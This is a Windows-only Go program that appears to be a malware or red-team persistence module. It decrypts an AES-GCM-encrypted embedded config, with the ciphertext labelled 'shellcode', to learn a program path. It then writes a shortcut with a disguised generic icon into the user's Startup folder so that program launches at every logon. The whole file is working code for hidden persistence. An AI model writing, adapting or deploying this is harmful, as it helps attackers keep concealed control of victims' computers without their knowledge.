//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	ole "github.com/go-ole/go-ole"
	oleutil "github.com/go-ole/go-ole/oleutil"
)

//go:embed encrypt.txt
var encryptionKey string

var robin string
var RobinConfig StartupConfig

type StartupConfig struct {
	Name string
	Path string
}

func decrypt(encryptionKey string) []byte {
	decoded, _ := base64.StdEncoding.DecodeString(robin)
	h := sha256.New()
	h.Write([]byte(encryptionKey))
	block, _ := aes.NewCipher(h.Sum(nil))
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, shellcode := decoded[:nonceSize], decoded[nonceSize:]
	plaintext, _ := aesGCM.Open(nil, nonce, shellcode, nil)
	return plaintext
}

func createLnk(executeTarget string, startupPath string) {
	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	oleShellObject, _ := oleutil.CreateObject("WScript.Shell")
	defer oleShellObject.Release()

	wShell, _ := oleShellObject.QueryInterface(ole.IID_IDispatch)
	defer wShell.Release()

	createShortcut, _ := oleutil.CallMethod(wShell, "CreateShortcut", startupPath)
	iDispatch := createShortcut.ToIDispatch()

	oleutil.PutProperty(iDispatch, "TargetPath", executeTarget)
	oleutil.PutProperty(iDispatch, "IconLocation", "shell32.dll,242")
	oleutil.CallMethod(iDispatch, "Save")
}

func main() {
	decrypted := decrypt(encryptionKey)
	json.Unmarshal(decrypted, &RobinConfig)

	userDir, _ := os.UserHomeDir()

	fullPath := fmt.Sprintf("%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.lnk", userDir, RobinConfig.Name)
	executable := RobinConfig.Path

	createLnk(executable, fullPath)
}
